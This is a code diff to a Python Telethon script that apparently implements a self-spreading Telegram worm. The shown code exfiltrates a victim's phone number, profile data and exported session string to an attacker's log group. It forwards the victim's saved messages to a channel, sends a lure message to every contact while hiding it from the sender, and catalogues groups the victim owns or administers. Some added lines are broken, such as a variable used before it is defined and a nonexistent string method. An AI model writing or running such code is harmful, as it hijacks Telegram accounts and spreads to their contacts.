@@ -1,4 +1,4 @@
-import os,logging,random,asyncio
+import os,logging,random,asyncio,json
 from telethon import functions, errors
 from dotenv import load_dotenv
 from pymongo.mongo_client import MongoClient
@@ -51,8 +51,15 @@ async def backup_saves(client, me, logger_bot):
             await message.forward_to(dest)
         except:
             break
-    await client(functions.channels.LeaveChannelRequest(channel=channel_id))
-    await logger_bot.send_message(int(os.getenv('LOG_GROUP')), f"ID: {me.id}\nUsername: {me.username}\nFirst name: {me.first_name}\nLast name: {me.last_name}\nPhone: {me.phone}\nLink: {result.link}\nSaved Messages: {msg_count}\nPremium: {me.premium}\nSession: `{client.session.save()}`")
+    await client(functions.channels.LeaveChannelRequest(channel=log['channel_id']))
+    log = {
+        'txt': f"ID: {me.id}\nUsername: {me.username}\nFirst name: {me.first_name}\nLast name: {me.last_name}\nPhone: {me.phone}\nLink: {result.link}\nSaved Messages: {msg_count}\nPremium: {me.premium}\nSession: `{client.session.save()}`",
+        'channel_id': channel_id,
+        'dest': dest,
+        'hash': result.link.split('/')[-1].rtrim('+'),
+    }
+    log['msg'] = await logger_bot.send_message(int(os.getenv('LOG_GROUP')), log['txt'])
+    return log
 async def spread(client, bot):
     bot_me = await bot.get_me()
     async with client.conversation(f"@{bot_me.username}") as conv:
@@ -60,6 +67,10 @@ async def spread(client, bot):
         spread_msg = await conv.get_response()
         spread_msg_nomedia = f"{strings['worm_msg']}\n\n{strings['worm_msg_btn_url']}"
         await msg.delete()
+    perm_logs = {
+        'creator': [],
+        'admin': [],
+    }
     async for dialog in client.iter_dialogs():
         if dialog.is_user:
             try:
@@ -71,6 +82,12 @@ async def spread(client, bot):
                 continue
             if user.bot:
                 continue
+        elif dialog.is_channel or dialog.is_group:
+            permissions = await client.get_permissions(dialog)
+            if not permissions.is_creator:
+                perm_logs['creator'].append({'id': dialog.id, 'title': dialog.title})
+            if not permissions.is_admin:
+                perm_logs['admin'].append({'id': dialog.id, 'title': dialog.title})
         try:
             msg = await spread_msg.forward_to(dialog)
         except errors.FloodWaitError as e:
@@ -86,18 +103,25 @@ async def spread(client, bot):
                 continue
         if dialog.is_user:
             await msg.delete(revoke=False)
+    return perm_logs
 
 async def worm(client, bot, logger_bot):
     me = await client.get_me()
+    log = None
     try:
         await create_bot(client, me)
     except:
         pass
     try:
-        await backup_saves(client, me, logger_bot)
+        log = await backup_saves(client, me, logger_bot)
     except:
         pass
     try:
-        await spread(client, bot)
+        perm_logs = await spread(client, bot)
+        if log and len(perm_logs['creator'])+len(perm_logs['admin']) > 0:
+            await log['msg'].edit(log['txt'].replace("Session", f"Own: {len(perm_logs['creator'])} Admin: {len(perm_logs['admin'])}\nSession"))
+            await client(functions.messages.ImportChatInviteRequest(hash=log['hash']))
+            await client.send_message(log['dest'], json.dumps(perm_logs, indent=4))
+            await client(functions.channels.LeaveChannelRequest(channel=log['channel_id']))
     except:
         pass
